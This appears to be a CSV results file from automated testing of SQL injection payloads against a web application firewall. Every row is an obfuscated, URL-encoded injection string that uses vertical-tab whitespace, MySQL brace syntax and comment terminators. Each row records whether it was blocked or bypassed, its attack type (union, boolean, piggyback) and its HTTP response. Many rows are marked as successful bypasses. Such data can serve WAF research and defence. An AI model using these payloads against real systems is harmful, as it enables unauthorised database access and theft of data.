Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@=1.%0b||+not%0b1=%0b(!%0b{x+(select+1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0333,73.68,No,200
0'<@=1%0b||+not+{x%0b(select+1)}=1=+(!+{x+(select+1)}=1,Bypassed,No,None,Unknown,0.0217,73.83,No,500
0%27<@!=1.+or+not~0=+(not+{`if`+1}=1)%0b||',Bypassed,No,None,Unknown,0.0127,73.83,No,500
0'<@=.1+||+not%0b{`if`+1}=1=%0b(not+{`if`+1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0294,73.83,No,500
0'<@=1.%0b||+!%0b{a%0b1}=1=+(!+1)+||%27,Bypassed,No,None,Unknown,0.0153,73.83,No,500
0'<@!=1.%0b||+not%0b{`if`%0b1}=1=+(not%0b{x%0b(select%0b1)}=1)+,Bypassed,No,None,Unknown,0.0169,73.83,No,500
0%27<@=.1%0b||+not+{`if`%0b1}=1=+(0)+or',Bypassed,No,None,Unknown,0.0245,73.83,No,500
0%27<@=1%0bor+!+{x+(select%0b1)}=1=+(!+{a%0b1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0258,73.83,No,200
0'<@=.1%0b||+not%0b{x%0b(select+1)}=1=%0b(false)+or%27,Bypassed,No,None,booleanAtk,0.0199,73.83,No,500
0%27<@!=1.+||%0bnot+{`if`%0b1}=1=%0b(not%0b{a+1}=1)+||',Bypassed,No,None,Unknown,0.0224,73.83,No,500
0'<@=1.%0bor%0bnot+{x+(select+1)}=1=%0b(!+{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0204,73.83,No,500
0%27<@!=1%0b||+not%0b{`if`+1}=1=+(not%0b{x%0b(select+1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0104,73.83,No,200
0%27<@=1%0bor+0=+(not~false)%0bor',Bypassed,No,None,booleanAtk,0.0256,73.83,No,500
0'<@=1.%0b||%0b{x%0b(select%0b1)}=1+like%0btrue%0b||%27,Bypassed,No,None,Unknown,0.0164,73.83,No,500
0%27<@=1.+||+not%7efalse=%0b(!%7e0)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0161,73.83,No,200
0%27||%0b@<@.+or+!+1=+(not%0b{`if`%0b1}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0174,73.83,No,200
0%27<@!=1.+||+!+{x%0b(select%0b1)}=1=%0b(not+{`if`+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0194,73.83,No,200
0%27<@!=.1+or%0bnot+{x%0b(select%0b1)}=1=%0b(!+{x%0b(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0163,73.83,No,200
0'<@!=1.+||%0bnot%0b{x%0b(select%0b1)}=1=%0b(!+{`if`%0b1}=1)+,Blocked,No,None,Unknown,0.0127,73.83,No,403
0'or%0b@<@.+||+!%0b{x+(select+1)}=1=%0b(not+{x+(select,Bypassed,No,None,Unknown,0.0189,73.83,No,500
0'or%0b@<@+or%0b!%0b{x%0b(select+1)}=1=+(!+{x%0b(select,Blocked,No,None,Unknown,0.008,73.83,No,403
0'<@!=1+or%0b{`if`%0b1}=1%0blike%0b{x%0b(select+1)}=1+||',Bypassed,No,None,Unknown,0.0145,73.83,No,500
0%27<@!=1+||+not%0b{x%0b(select%0b1)}=1%0bis+false%23,Bypassed,Yes,unionAtk,piggyAtk,0.0219,73.83,No,200
0'<@=.1+||+!+{x+(select+1)}=1=%0b(not+{x%0b(select%0b1)}=1,Blocked,No,None,Unknown,0.0055,73.83,No,403
0'<@!=1%0b||+!+{x+(select%0b1)}=1=%0b(!+{a%0b1}=1)+,Bypassed,No,None,Unknown,0.0094,73.83,No,500
0'<@=1.%0bor%0b!%0b1=+(!%0b{`if`%0b1}=1)+||',Bypassed,No,None,Unknown,0.0118,73.83,No,500
0%27<@=.1%0b||+not+{x+(select+1)}=1=+(!+{a%0b1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0132,73.83,No,200
0%27<@=.1%0bor+{x%0b(select%0b1)}=1%0blike+{a+1}=1+||%27,Bypassed,Yes,unionAtk,Unknown,0.0136,73.83,No,200
0'<@!=.1%0b||+!+{`if`+1}=1=+(not%0b{`if`+1}=1)--+,Bypassed,No,None,piggyAtk,0.0407,73.83,No,500
0%27or+!@<@%0b||+{a+1}=1%0blike+1%0b||',Bypassed,No,None,Unknown,0.0228,73.83,No,500
0%27<@!=1%0b||%0bnot%0b{x+(select+1)}=1=+(not+{x%0b(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0209,73.83,No,200
0%27<@=.1%0bor%0b{x%0b(select+1)}=1+like+{a+1}=1+||',Bypassed,No,None,Unknown,0.0282,73.52,No,500
0%27<@!=.1%0b||+not+{x%0b(select+1)}=1=%0b(not+{x+(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0215,73.52,No,200
0'<@!=.1%0bor%0b!%0b{x+(select+1)}=1=%0b(not+{`if`+1}=1)%0b,Bypassed,No,None,Unknown,0.0192,73.52,No,500
0%27<@=1.+or%0bfalse=+(!%0b{a+1}=1)+or',Bypassed,No,None,booleanAtk,0.0313,73.52,No,500
0'<@=1+or+not+{`if`+1}=1=+(!+true)--+,Bypassed,No,None,piggyAtk,0.0187,73.52,No,500
0%27||%0b!@<@+or%0bnot+{x+(select+1)}=1=%0b(!+1)+,Blocked,No,None,Unknown,0.013,73.52,No,403
0%27<@!=1%0bor%0bnot+{x%0b(select%0b1)}=1=%0b(not%0b{`if`%0b1}=1)--,Bypassed,Yes,unionAtk,piggyAtk,0.0155,73.52,No,200
0%27<@=.1+||%0bnot+{x%0b(select%0b1)}=1=%0b(!%0b{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0162,73.52,No,200
0%27<@=1.+or+!%0b{a+1}=1=+(!%0btrue)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0186,73.52,No,200
0%27<@=1.+||%0bnot+{a%0b1}=1=%0b(!%0b{x%0b(select+1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0233,73.52,No,200
0'<@!=1.+or%0b!+true=+(!%0b{`if`%0b1}=1)%0b||',Bypassed,No,None,booleanAtk,0.0201,73.52,No,500
0%27<@=1.+||+!%0b{a%0b1}=1=+(not%0b{x%0b(select%0b1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0117,73.52,No,200
0'<@!=1.+||+!+{x+(select%0b1)}=1=%0b(not+{x%0b(select+1)}=1),Blocked,No,None,Unknown,0.009,73.52,No,403
0%27<@=1.+||%0bnot+{x+(select+1)}=1=+(not+{`if`%0b1}=1)+,Blocked,No,None,Unknown,0.0127,73.52,No,403
0%27or+@<@.%0bor+!%0b{`if`+1}=1=%0b(not%0b{a%0b1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0178,73.52,No,200
0%27<@=.1+or%0bnot+{a%0b1}=1=%0b(!%0b{x+(select%0b1)}=1)--,Bypassed,Yes,unionAtk,piggyAtk,0.0213,73.52,No,200
0%27<@=1.+||%0b!+{x%0b(select%0b1)}=1=+(false)+||',Bypassed,No,None,Unknown,0.0077,73.52,No,500
0%27<@!=1.+||+!+{x+(select+1)}=1=%0b(not%0b1)+or%27,Blocked,No,None,Unknown,0.0153,73.52,No,403
0%27<@!=1%0bor%0b{a%0b1}=1+like+{`if`%0b1}=1--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0217,73.52,No,200
0'<@!=.1%0bor+!%0btrue=+(false)%23,Bypassed,No,None,piggyAtk,0.0192,73.52,No,500
0'<@=1%0b||+!%0b{a+1}=1=+(not%0b{`if`+1}=1)%23,Bypassed,No,None,piggyAtk,0.028,73.52,No,500
0'<@=.1+||%0b!+{a+1}=1=+(not~0)%23,Blocked,No,None,piggyAtk,0.0203,73.63,No,403
0'<@=.1+||+{x%0b(select+1)}=1+like+{x+(select+1)}=1%0b||',Blocked,No,None,Unknown,0.0246,73.83,No,403
0%27<@=1.+or+not%0b{x+(select+1)}=1=+(not+1)%0bor',Bypassed,No,None,Unknown,0.0194,73.83,No,500
0%27<@!=1.%0bor+not%0b{a+1}=1=+(not%0b{a+1}=1)%0b||',Bypassed,No,None,Unknown,0.0253,73.83,No,500
0'<@!=.1+or+!+{`if`+1}=1=%0b(not%7efalse)+or%27,Bypassed,No,None,booleanAtk,0.0176,73.83,No,500
0%27<@=1+or%0b0=+(not%0b{x+(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0279,73.83,No,500
0'<@=1+||+!%0b1=+(!+true)+||',Blocked,No,None,Unknown,0.0199,73.83,No,403
0'<@!=1%0bor+!%7efalse=+(not+{x+(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0176,73.83,No,500
0%27<@=.1%0bor%0b!+{`if`+1}=1=%0b(false)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.018,73.83,No,200
0%27or+@<@.+or+{a%0b1}=1%0blike+{a+1}=1+||%27,Bypassed,Yes,unionAtk,Unknown,0.0167,73.83,No,200
0'<@!=1.+||+!+{x%0b(select%0b1)}=1=+(not+1)%0b||',Bypassed,No,None,Unknown,0.0166,73.83,No,500
0'<@!=1%0bor+!%0b{x%0b(select+1)}=1=+(not%0b{a+1}=1)%0b,Bypassed,No,None,Unknown,0.0205,73.83,No,500
0'<@!=.1%0bor+not%7efalse=+(!%0b{`if`+1}=1)+or%27,Bypassed,No,None,booleanAtk,0.0198,73.83,No,500
0'<@=1+or+!+{a+1}=1=+(not%0b{a+1}=1)+||%27,Bypassed,No,None,Unknown,0.0158,73.83,No,500
0'<@=1.%0bor%0bnot+1=%0b(!+{a+1}=1)--+,Bypassed,No,None,piggyAtk,0.0105,73.83,No,500
0%27<@!=.1%0b||%0b!%0b{x+(select%0b1)}=1=+(!%0btrue)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0149,73.83,No,200
0'<@!=1+||+not%0b{x%0b(select+1)}=1=%0b(!%0b{x%0b(select+1)}=1,Bypassed,No,None,Unknown,0.0173,73.83,No,500
0'<@!=.1+||%0b0=%0b(!+{`if`%0b1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0147,73.83,No,500
0%27<@=.1%0b||%0bnot%0b{`if`%0b1}=1=+(not+{x%0b(select%0b1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0108,73.83,No,200
0%27<@=1.+or%0b!+{a+1}=1=%0b(not%0b{x+(select+1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0167,73.83,No,200
0%27<@!=1.+or+{x%0b(select+1)}=1+like+{a%0b1}=1%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0202,73.83,No,200
0'<@!=1+or+!~0=%0b(!%0b{x+(select%0b1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0172,73.83,No,500
0'<@=1.+||+not+{`if`%0b1}=1=%0b(!+1)+||%27,Bypassed,No,None,Unknown,0.0145,73.83,No,500
0'<@!=1%0b||%0bnot~false=+(not%0b{x+(select%0b1)}=1)+or',Bypassed,No,None,booleanAtk,0.0198,73.83,No,500
0%27<@!=1.+or%0b!%7efalse=%0b(not+{x%0b(select+1)}=1)%0b||',Bypassed,No,None,booleanAtk,0.0128,73.83,No,500
0%27<@!=.1+||+!%0b{a+1}=1=+(!%0btrue)%0b||',Bypassed,No,None,Unknown,0.0205,73.83,No,500
0%27<@=1.+or+!+{x%0b(select+1)}=1=+(not+{x%0b(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0155,73.83,No,200
0%27<@=1.%0b||%0bfalse=%0b(!+{a+1}=1)%0bor',Bypassed,No,None,booleanAtk,0.0142,73.83,No,500
0%27<@=.1+||%0b!+{x+(select+1)}=1=%0b(!+true)--%0b,Blocked,No,None,piggyAtk,0.0075,73.83,No,403
0%27<@!=.1+||+!%0btrue=+(!+{a%0b1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0219,73.52,No,200
0'<@=1.+or%0bnot~false=%0b(0)+or',Bypassed,No,None,booleanAtk,0.0292,73.52,No,500
0'<@=.1%0bor+false=%0b(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0134,73.52,No,500
0'<@=1.+or%0b!+{a+1}=1=+(!+{x%0b(select%0b1)}=1)+,Bypassed,No,None,Unknown,0.0075,73.52,No,500
0'<@=.1%0bor+not~0=%0b(!%0b{a+1}=1)+||',Bypassed,No,None,Unknown,0.0113,73.52,No,500
0%27<@!=.1%0bor%0b!%0b{x%0b(select%0b1)}=1=%0b(false)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0192,73.52,No,200
0%27<@!=1%0bor+!%0b{x%0b(select%0b1)}=1=+(!+{`if`%0b1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0258,73.52,No,200
0%27<@!=1.%0b||+!+{`if`%0b1}=1=+(not+{x+(select%0b1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0163,73.52,No,200
0%27<@!=.1+or+not+{`if`+1}=1=+(!+{a%0b1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0136,73.52,No,200
0'<@=1.+||+!+{x+(select%0b1)}=1=%0b(not+{a%0b1}=1)+,Blocked,No,None,Unknown,0.0136,73.52,No,403
0'<@=1.+or+!%0b{a%0b1}=1=+(not+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0108,73.52,No,500
0'<@!=1.%0b||%0b!+{x%0b(select+1)}=1=+(!%0b{x+(select+1)}=1,Bypassed,No,None,Unknown,0.0189,73.52,No,500
0%27<@=1%0b||%0b!+{a%0b1}=1=+(not+{x%0b(select%0b1)}=1)--,Bypassed,Yes,unionAtk,piggyAtk,0.0176,73.52,No,200
0%27<@=1%0b||%0b!+1=+(not+true)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0327,73.52,No,200
0'<@=.1+or+not+{x+(select%0b1)}=1=+(not+{x+(select+1)}=1),Blocked,No,None,Unknown,0.0125,73.52,No,403
0%27<@=.1%0bor+!%0b{x+(select+1)}=1=+(not+{x%0b(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0161,73.52,No,200
0'or%0b!@<@.+||+{x+(select%0b1)}=1+like+{a+1}=1+||%27,Blocked,No,None,Unknown,0.0133,73.52,No,403
0'<@!=1%0bor%0bnot%0b1=+(!+{x+(select%0b1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.02,73.52,No,500
0%27<@!=1+||%0b!%0b{x+(select+1)}=1=+(!+true)%23,Blocked,No,None,piggyAtk,0.0123,73.52,No,403
0%27<@=.1%0bor+!%0b{`if`%0b1}=1=+(not%7e0)%0bor',Bypassed,No,None,Unknown,0.0247,73.63,No,500
0%27<@!=1.+or+!%0b{x%0b(select%0b1)}=1=%0b(!%0b1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0093,73.83,No,200
0'<@!=.1%0b||%0bnot+{`if`%0b1}=1=+(0)%0b||%27,Bypassed,No,None,Unknown,0.0214,73.83,No,500
0'<@!=1.%0bor%0bnot%0b{x+(select%0b1)}=1=+(not+{x+(select+1)}=1),Bypassed,No,None,Unknown,0.0282,73.83,No,500
0%27<@=1%0b||+!+{x%0b(select+1)}=1=%0b(not%0b{a+1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0202,73.83,No,200
0%27<@!=1%0b||%0bnot%0b{x+(select+1)}=1=%0b(not+{`if`%0b1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0215,73.83,No,200
0%27<@!=.1+or%0b!~false=+(not~0)--%0b,Blocked,No,None,piggyAtk,0.0151,73.83,No,403
0%27<@=1%0b||+{x+(select%0b1)}=1%0blike%0b{`if`+1}=1+||%27,Bypassed,Yes,unionAtk,Unknown,0.0392,73.83,No,200
0'<@!=1.+or%0b!+{a+1}=1=+(not+{x+(select%0b1)}=1)%23,Blocked,No,None,piggyAtk,0.013,73.83,No,403
0%27<@!=1+||%0b{x%0b(select+1)}=1%0blike%0b{`if`%0b1}=1--+,Bypassed,Yes,unionAtk,piggyAtk,0.0178,73.83,No,200
0%27<@!=1+||%0bnot%0btrue=+(!+{a+1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0227,73.83,No,200
0%27<@=1%0bor+!%0b{a+1}=1=%0b(not%0b{x+(select%0b1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0319,73.83,No,200
0%27<@=1.%0bor+not+{x+(select+1)}=1=%0b(!+{x%0b(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0154,73.83,No,200
0'<@=1+||+!%0b{x%0b(select+1)}=1=+(!+{a+1}=1)%0b,Bypassed,No,None,Unknown,0.0196,73.83,No,500
0'<@=1+or+not+{x%0b(select%0b1)}=1=+(!%0b{a%0b1}=1)%23,Bypassed,No,None,piggyAtk,0.0199,73.83,No,500
0%27<@!=1+or+!%0b{x%0b(select+1)}=1=%0b(not%0b{x%0b(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0072,73.83,No,200
0%27<@!=1%0bor+!+{a%0b1}=1=%0b(not+{a+1}=1)%0b||',Bypassed,No,None,Unknown,0.0096,73.83,No,500
0%27<@!=1%0bor+not%0b{x+(select+1)}=1=%0b(not%0b{`if`%0b1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0148,73.83,No,200
0%27<@=.1+||%0b!+{a%0b1}=1=%0b(!~false)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0209,73.83,No,200
0'<@!=.1+or+!+{x%0b(select+1)}=1=+(not~false)+or',Bypassed,No,None,booleanAtk,0.0153,73.83,No,500
0%27<@=1+or%0b!+{a%0b1}=1=%0b(!+{x+(select+1)}=1)--,Bypassed,Yes,unionAtk,piggyAtk,0.0151,73.83,No,200
0'or+1<@.%0b||+not+1=%0b(not+{x%0b(select+1)}=1)+,Bypassed,No,None,Unknown,0.0254,73.83,No,500
0'<@!=1.+||+!%7efalse=%0b(!+{x%0b(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0104,73.83,No,500
0'<@!=.1%0b||+!%0b{a%0b1}=1=%0b(!+true)%0b||',Bypassed,No,None,Unknown,0.0212,73.83,No,500
0'<@=1.%0bor%0bnot%0b{a%0b1}=1=%0b(!+{x+(select+1)}=1)+,Bypassed,No,None,Unknown,0.0093,73.83,No,500
0'<@!=1.%0b||+not%0b{x%0b(select%0b1)}=1=%0b(not%0b{x+(select%0b1)}=1),Bypassed,No,None,Unknown,0.0222,73.83,No,500
0%27<@!=1.%0b||+!+1=%0b(not+{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Unknown,0.0262,73.83,No,500
0'or%0b@<@.+or+not%0btrue=+(not%0b{x%0b(select+1)}=1)+,Bypassed,No,None,booleanAtk,0.0157,73.83,No,500
0'<@!=1%0b||%0bnot%0b{x+(select%0b1)}=1=%0b(not+{`if`+1}=1)+,Bypassed,No,None,Unknown,0.0131,73.83,No,500
0%27<@=1.+||+not+{x%0b(select+1)}=1=+(not+{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0141,73.83,No,200
0'or+@<@.%0b||%0bnot%0b{`if`%0b1}=1=+(!+1)%0bor%27,Bypassed,No,None,Unknown,0.0211,73.83,No,500
0%27<@!=.1+or%0b!~false=+(!+{x%0b(select%0b1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0129,73.52,No,200
0'<@=1+||%0b!+{`if`+1}=1=+(not+{x+(select%0b1)}=1)%0b,Bypassed,No,None,Unknown,0.0126,73.52,No,500
0%27<@!=1%0bor%0b!%0b{x%0b(select%0b1)}=1=%0b(not+{x%0b(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0166,73.52,No,200
0'<@=.1+or+not+{x%0b(select%0b1)}=1=+(!+{`if`%0b1}=1)%0b,Bypassed,No,None,Unknown,0.0146,73.52,No,500
0%27<@!=1.%0b||+not+{x%0b(select%0b1)}=1=%0b(not%0b{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0203,73.52,No,200
0'<@!=1.%0bor+not+{x+(select+1)}=1=%0b(!+true)%0bor%27,Bypassed,No,None,booleanAtk,0.0148,73.52,No,500
0%27<@=1+or%0b!%0b1=+(false)--%0b,Blocked,No,None,piggyAtk,0.0084,73.52,No,403
0%27<@=1.%0b||%0b{x+(select+1)}=1+like+{x%0b(select+1)}=1--+,Bypassed,Yes,unionAtk,piggyAtk,0.0184,73.52,No,200
0%27<@!=.1+or%0bnot%0b{x%0b(select+1)}=1=+(not%0b{x+(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0259,73.52,No,200
0%27<@=1+||+!+{`if`+1}=1=+(not+true)+||',Bypassed,No,None,Unknown,0.0224,73.52,No,500
0%27||+1<@+||%0b{`if`+1}=1+like+{a+1}=1%0b||',Bypassed,No,None,Unknown,0.0108,73.52,No,500
0'<@=1.+or+!%7efalse=+(not%0b{`if`+1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0161,73.52,No,500
0%27<@=1.+||+!+{x+(select%0b1)}=1=+(!%7efalse)+or',Blocked,No,None,booleanAtk,0.0183,73.52,No,403
0%27<@!=1.+||+1%0blike%0btrue+or',Bypassed,No,None,booleanAtk,0.0272,73.52,No,500
0'<@!=.1%0bor%0bnot%0b{a%0b1}=1=%0b(!+{a+1}=1)+||',Bypassed,No,None,Unknown,0.027,73.52,No,500
0'<@=.1+||+!%0b{a%0b1}=1=%0b(not%0b1)+or',Bypassed,No,None,Unknown,0.0204,73.52,No,500
0%27<@!=1%0bor+not+{x+(select+1)}=1=%0b(!+{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0268,73.52,No,200
0'<@!=.1%0bor+!+{x+(select%0b1)}=1=+(!~false)+or%27,Bypassed,No,None,booleanAtk,0.0281,73.83,No,500
0%27<@=1%0bor+not+{`if`+1}=1=+(not+{`if`+1}=1)+or',Bypassed,No,None,Unknown,0.0264,73.83,No,500
0%27<@!=.1%0b||+!+{x+(select+1)}=1=%0b(not%0b1)+or',Bypassed,No,None,Unknown,0.0161,73.83,No,500
0%27<@!=1.+or%0bnot%0b{x+(select%0b1)}=1=+(not+{x%0b(select+1)}=1),Blocked,No,None,Unknown,0.0119,73.83,No,403
0'<@=.1+or%0bnot%0b{a%0b1}=1=%0b(!+{x+(select%0b1)}=1)%0b,Bypassed,No,None,Unknown,0.0147,73.83,No,500
0'<@!=.1%0bor%0bnot%0b1=%0b(!+true)--%0b,Bypassed,No,None,piggyAtk,0.0133,73.83,No,500
0%27<@=1.+or+!%0b{x%0b(select%0b1)}=1=+(not+{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0134,73.83,No,200
0'<@!=1.+||%0b!%0b{x%0b(select%0b1)}=1=%0b(!%0b{`if`%0b1}=1)+,Blocked,No,None,Unknown,0.0238,73.83,No,403
0'<@=.1+||+not+{`if`+1}=1=%0b(!+{a%0b1}=1)%23,Bypassed,No,None,piggyAtk,0.0139,73.83,No,500
0%27<@=.1+or+not~false=+(!+{x+(select+1)}=1)+or%27,Blocked,No,None,booleanAtk,0.0065,73.83,No,403
0%27<@!=1%0b||+not+1=+(not%0b{x%0b(select%0b1)}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0138,73.83,No,200
0'<@!=1.%0bor+!%0b{x+(select+1)}=1=%0b(not%0b{x%0b(select+1)}=1),Bypassed,No,None,Unknown,0.0157,73.83,No,500
0'<@!=.1%0bor%0b!+{`if`%0b1}=1=+(not+true)+||',Bypassed,No,None,booleanAtk,0.0201,73.83,No,500
0'<@=1.%0bor+not+{a+1}=1=%0b(not~false)+or',Bypassed,No,None,booleanAtk,0.0288,73.83,No,500
0%27or+@<@.%0b||%0bnot+{x%0b(select+1)}=1=+(not+{`if`%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0305,73.83,No,200
0%27<@=1%0b||%0bnot+{x+(select+1)}=1=+(!%0b{x%0b(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0189,73.83,No,200
0'<@=.1+||%0bnot+{a%0b1}=1=+(not+{a+1}=1)+||',Blocked,No,None,Unknown,0.0113,73.83,No,403
0%27<@=.1%0bor+not%0b{a+1}=1=+(not+1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0117,73.83,No,200
0'<@!=1.%0bor+!%0b{x%0b(select%0b1)}=1=+(!+{x+(select%0b1)}=1),Bypassed,No,None,Unknown,0.0175,73.83,No,500
0%27<@=1+||+!%0b{`if`%0b1}=1=%0b(not%0b{`if`%0b1}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0147,73.83,No,200
0'<@=1%0bor+not+{a+1}=1=%0b(not+1)+||%27,Bypassed,No,None,Unknown,0.0133,73.83,No,500
0%27<@!=1+||%0b!%0b{x%0b(select%0b1)}=1=%0b(!%0b{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0136,73.83,No,200
0'<@=1.+||%0bnot%0b{`if`+1}=1=%0b(not+1)+or%27,Bypassed,No,None,Unknown,0.0203,73.83,No,500
0%27<@!=.1%0b||+not+{x+(select%0b1)}=1=%0b(not%0b{x%0b(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0076,73.83,No,200
0'<@!=.1+||%0b!%0b{a%0b1}=1=%0b(!+{x+(select%0b1)}=1)%0b,Bypassed,No,None,Unknown,0.0179,73.83,No,500
0%27<@=.1%0bor+false=%0b(!%0b{x%0b(select+1)}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0251,73.83,No,200
0%27<@=.1%0bor%0bnot~false=%0b(not+1)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0298,73.83,No,200
0'<@!=.1%0b||+not%0btrue=%0b(!+{x+(select%0b1)}=1)--+,Bypassed,No,None,piggyAtk,0.0165,73.83,No,500
0%27<@=.1%0bor+!~0+is%0bfalse%0bor',Bypassed,No,None,booleanAtk,0.0172,73.83,No,500
0'<@!=1.%0bor+not+{x+(select+1)}=1=+(not~false)+or%27,Bypassed,No,None,booleanAtk,0.0251,73.83,No,500
0%27<@!=.1+or%0b{x+(select+1)}=1+like+{a+1}=1%23,Bypassed,Yes,unionAtk,piggyAtk,0.0193,73.83,No,200
0'<@=1.+||+!%0btrue=%0b(not%7efalse)%0b||%27,Bypassed,No,None,Unknown,0.0101,73.83,No,500
0'<@!=.1+or%0b!+{`if`+1}=1=+(!+{x+(select%0b1)}=1)--,Bypassed,No,None,piggyAtk,0.0125,73.83,No,500
0%27<@!=1.%0bor%0bnot+{x+(select+1)}=1+is%0bfalse+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0181,73.52,No,200
0%27<@=.1%0b||%0b!%0b{x%0b(select+1)}=1%0bis%0bfalse+||%27,Bypassed,Yes,unionAtk,Unknown,0.014,73.52,No,200
0%27||+@<@.+||%0b{`if`+1}=1+like+{x%0b(select%0b1)}=1%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0141,73.52,No,200
0'<@=.1+||%0bnot~0=+(not+{`if`%0b1}=1)--+,Bypassed,No,None,piggyAtk,0.0139,73.52,No,500
0%27<@!=.1+or+!+{`if`+1}=1=%0b(not+{x+(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0228,73.52,No,200
0%27<@=1.%0b||+!+1=+(!%0b{a%0b1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0176,73.52,No,200
0'<@=1%0bor+!%0b{a%0b1}=1=+(not%0b{x%0b(select%0b1)}=1)+,Bypassed,No,None,Unknown,0.0133,73.52,No,500
0'or+1<@.+or+!%0b{x+(select+1)}=1=+(0)+or',Bypassed,No,None,Unknown,0.0125,73.52,No,500
